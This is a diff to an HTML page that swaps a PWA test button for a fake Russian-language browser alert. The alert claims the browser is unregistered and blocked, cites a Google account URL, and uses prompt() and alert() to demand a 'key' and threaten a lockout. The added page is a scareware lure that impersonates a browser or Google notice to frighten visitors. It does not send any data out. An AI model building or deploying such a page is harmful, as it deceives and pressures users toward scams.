@@ -11,8 +11,21 @@ background:grey;
     <link rel="manifest" href="/manifest.json">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
 </head>
+<script>
+function reg() {
+prompt('Введите ваш ключ:')
+alert('Неправильный ключ!')
+}
+function no() {
+alert('Доступ к браузеру будет заблокирован.')
+reg()
+}
+</script>
 <body>
-<h2>Pwa test!</h2>
-<pwa-install>Install!</pwa-install>
+<div class="trap">
+	<div class="trap__form">
+		<div class="confirm" style="top:-3px;position:fixed;left:50%;width:402px;margin:0 0 0 -221px;background-color:#fbfbfb;border:1px solid #c7c7c7;padding:16px 19px 21px 19px;border-radius:3px;font:11.7px Arial;color:#000;box-shadow:0 3px 3px -2px rgba(0,0,0,0.5)"><div style="float:right;margin:-17px -11px;font-size:18px;color:#808080;cursor:pointer;">×</div><div style="font: 14px Verdana, Arial;text-align:left !important;margin-bottom:4px">Уведомление</div><br><div style="font:10.5px Verdana, Arial;text-align:left !important;margin:-2px 0 1px 0">Мы обнаружили что ваша копия браузера незарегестрирована . <br> И мы заблокировали браузер, <br> Подробнее: https://account.google.com/</div><br><div style="float:right;margin-top:10px"><button style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #6e80ff;font-weight:700;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);" onclick = "reg()">Регистрация</button><button style="background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px 0 3px;font-size:11px;cursor:pointer;border-radius:2px;border: 1px solid #bfbfbf;font-weight:200;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);" onclick="no()">Закрыть</button></div></div>
+	</div>
+</div>
 </body>
 </html>
